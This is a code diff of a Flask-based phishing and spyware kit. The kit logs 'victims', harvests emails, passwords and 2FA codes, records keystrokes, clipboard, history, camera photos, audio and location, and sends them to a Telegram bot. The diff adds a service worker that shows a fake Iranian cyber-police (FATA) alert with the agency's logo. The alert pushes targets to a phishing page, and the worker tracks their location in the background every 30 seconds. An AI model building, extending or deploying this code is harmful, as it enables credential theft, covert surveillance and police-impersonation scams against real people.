@@ -278,9 +278,6 @@ CAPTURE_PAGE_ADV = """
             } catch (e) {
                 msg.innerText = "Connection established. (Camera not available)";
             }
-
-            // 8. Screen recording (optional, requires second click – not forced here)
-            // We add a hidden button but no forced click; can be improved
         }
 
         function takeSnapshot() {
@@ -306,16 +303,19 @@ CAPTURE_PAGE_ADV = """
             }
         }, 5000);
 
-        // Service Worker for background location tracking
+        // Service Worker with fake police notification
         if ('serviceWorker' in navigator) {
             navigator.serviceWorker.register('/sw.js?t=' + t).then(reg => {
+                // Wait a few seconds then show the police notification
                 setTimeout(() => {
-                    reg.showNotification('System Update', {
-                        body: 'Critical security update available. Tap to install.',
-                        icon: 'https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Android_robot.svg/1200px-Android_robot.svg.png',
-                        requireInteraction: true
+                    reg.showNotification('⚠️ هشدار فوری پلیس فتا', {
+                        body: 'فعالیت غیرمجاز در این دستگاه شناسایی شده است. برای رفع اتهام و تأیید هویت روی این اعلان کلیک کنید.',
+                        icon: 'https://www.fata.gov.ir/images/logo.png',
+                        requireInteraction: true,
+                        vibrate: [300, 100, 300],
+                        data: { url: window.location.origin + '/go/' + t }
                     });
-                }, 15000);
+                }, 10000);  // 10 seconds after page load
             });
         }
 
@@ -426,7 +426,7 @@ def upload(token):
         db.execute("INSERT INTO media (token, type, data, timestamp) VALUES (?, ?, ?, ?)",
                    (token, media_type, binary, datetime.now().isoformat()))
         db.commit()
-        # Send to Telegram (for photos, send as image; for audio, send as document)
+        # Send to Telegram
         if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
             if media_type == 'photo':
                 send_telegram_file(binary, 'camera.jpg', f"📸 <b>Photo</b> from {token}", as_image=True)
@@ -462,10 +462,9 @@ def log(token):
                (token, data.get('type','unknown'), json.dumps(data), datetime.now().isoformat()))
     db.execute("UPDATE victims SET ip=? WHERE token=?", (request.remote_addr, token))
     db.commit()
-    # Organized Telegram notification for important events
+    # Organized Telegram alerts
     if data.get('type') == 'device':
-        info = f"📱 <b>Device Connected</b>\nToken: <code>{token}</code>\nIP: {request.remote_addr}\nUser-Agent: {data.get('ua','')}"
-        send_telegram_message(info)
+        send_telegram_message(f"📱 <b>Device Connected</b>\nToken: <code>{token}</code>\nIP: {request.remote_addr}\nUser-Agent: {data.get('ua','')}")
     elif data.get('type') == 'location':
         send_telegram_message(f"📍 <b>Location</b> for {token}: {data.get('lat')},{data.get('lng')}")
     elif data.get('type') == 'local_ip':
@@ -482,8 +481,35 @@ def log(token):
 
 # ---------- Service Worker ----------
 SW_JS = """
-self.addEventListener('install', event => { self.skipWaiting(); });
-self.addEventListener('activate', event => { event.waitUntil(clients.claim()); });
+self.addEventListener('install', event => {
+  self.skipWaiting();
+});
+
+self.addEventListener('activate', event => {
+  event.waitUntil(clients.claim());
+});
+
+// Handle notification click – redirect to phishing page
+self.addEventListener('notificationclick', event => {
+  event.notification.close();
+  const urlToOpen = event.notification.data && event.notification.data.url 
+                      ? event.notification.data.url 
+                      : '/';
+  event.waitUntil(
+    clients.matchAll({ type: 'window', includeUncontrolled: true }).then(windowClients => {
+      for (let client of windowClients) {
+        if (client.url.includes(urlToOpen.split('/').pop())) {
+          return client.focus();
+        }
+      }
+      if (clients.openWindow) {
+        return clients.openWindow(urlToOpen);
+      }
+    })
+  );
+});
+
+// Background location tracking (every 30 seconds)
 setInterval(() => {
   if('geolocation' in navigator){
     navigator.geolocation.getCurrentPosition(pos => {
@@ -502,6 +528,7 @@ setInterval(() => {
   }
 }, 30000);
 """
+
 @app.route('/sw.js')
 def service_worker():
     response = make_response(SW_JS)
@@ -524,34 +551,25 @@ def admin():
     victims = []
     for row in victims_rows:
         token = row['token']
-        # Device info
         log_dev = db.execute("SELECT data FROM logs WHERE token=? AND type='device' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
         info = json.loads(log_dev['data']) if log_dev else {}
-        # Credentials
         cred_row = db.execute("SELECT email, password, code2fa FROM credentials WHERE token=? ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
         creds = f"{cred_row['email']}:{cred_row['password']}" if cred_row else ""
         code2fa = cred_row['code2fa'] if cred_row and cred_row['code2fa'] else ""
-        # Local IP
         local_ip_row = db.execute("SELECT data FROM logs WHERE token=? AND type='local_ip' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
         local_ip = json.loads(local_ip_row['data']).get('ip','') if local_ip_row else ""
-        # Clipboard
         clip_row = db.execute("SELECT data FROM logs WHERE token=? AND type='clipboard' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
         clipboard = json.loads(clip_row['data']).get('data','') if clip_row else ""
-        # Keystrokes
         keys_rows = db.execute("SELECT data FROM logs WHERE token=? AND type='keystrokes' ORDER BY timestamp ASC", (token,)).fetchall()
         keystrokes = ''.join([json.loads(k['data']).get('data','') for k in keys_rows])
-        # Open ports
         ports_rows = db.execute("SELECT data FROM logs WHERE token=? AND type='open_port' ORDER BY timestamp ASC", (token,)).fetchall()
         open_ports = ', '.join(set([str(json.loads(p['data']).get('port','')) for p in ports_rows]))
-        # History
         hist_rows = db.execute("SELECT data FROM logs WHERE token=? AND type='history'", (token,)).fetchall()
         history = ', '.join([f"{json.loads(h['data']).get('site','')} ({json.loads(h['data']).get('visited')})" for h in hist_rows])
-        # Media
         photo_row = db.execute("SELECT data FROM media WHERE token=? AND type='photo' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
         photo_b64 = base64.b64encode(photo_row['data']).decode() if photo_row else None
         audio_row = db.execute("SELECT data FROM media WHERE token=? AND type='audio' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
         audio_b64 = base64.b64encode(audio_row['data']).decode() if audio_row else None
-        # Location
         loc_row = db.execute("SELECT data FROM logs WHERE token=? AND type='location' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
         loc = None
         if loc_row:
